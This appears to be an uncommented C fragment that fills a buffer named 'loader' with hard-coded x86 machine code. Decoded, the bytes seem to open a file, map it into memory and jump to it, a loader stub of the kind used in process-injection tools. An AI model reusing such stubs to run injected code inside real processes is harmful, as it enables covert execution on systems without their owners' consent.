	*(uint32_t*)(loader + 0x00) = 0x58056a60;
	*(uint32_t*)(loader + 0x04) = 0x5c8bc931;
	*(uint32_t*)(loader + 0x08) = 0x80cd2424;
	*(uint32_t*)(loader + 0x0c) = 0x00000068;
	*(uint32_t*)(loader + 0x10) = 0x51415000;
	*(uint32_t*)(loader + 0x14) = 0x5551056a;
	*(uint32_t*)(loader + 0x18) = 0x5ab0e389;
	*(uint32_t*)(loader + 0x1c) = 0xe0ff80cd;
